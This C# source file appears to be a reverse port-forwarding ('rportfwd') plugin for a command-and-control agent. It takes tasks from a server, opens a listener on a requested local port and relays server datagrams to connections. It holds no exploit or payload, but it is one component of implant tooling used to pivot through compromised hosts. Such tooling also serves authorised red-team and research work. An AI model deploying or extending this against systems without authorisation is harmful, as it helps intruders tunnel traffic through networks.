using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;

namespace Agent
{
    public class Plugin : IPlugin, IProxyPlugin
    {
        public string Name => "rportfwd";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<int, ConnectionConfig> connections { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.connections = new ConcurrentDictionary<int, ConnectionConfig>();
            this.logger = logger;
        }

        public async Task Execute(ServerJob job)
        {
            var parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
            int port;
            if (int.TryParse(parameters["lport"], out port))
            {
                if (connections.ContainsKey(port))
                {
                    await ReturnError("Port in use.", job.task.id);
                    return;
                }

                ConnectionConfig cc = new ConnectionConfig(port, messageManager);
                if(this.connections.TryAdd(port, cc))
                {
                    await messageManager.AddResponse(new TaskResponse()
                    {
                        task_id = job.task.id,
                        user_output = "Listening.",
                        completed = true
                    });
                    return;
                }
                await ReturnError("Failed to start (Unknown)", job.task.id);

                return;
            }

            await ReturnError("Failed to parse port, please use a valid numerical value.", job.task.id);

            return;
        }

        public async Task HandleDatagram(ServerDatagram sm)
        {
            foreach (var connection in this.connections)
            {
                if (connection.Value.HasClient(sm.server_id))
                {
                    _ = connection.Value.HandleMessage(sm);
                    break;
                }
            }
        }

        private async Task ReturnError(string message, string task_id)
        {
            await messageManager.AddResponse(new TaskResponse()
            {
                task_id = task_id,
                user_output = message,
                status = "error",
                completed = true
            });
        }
    }
}
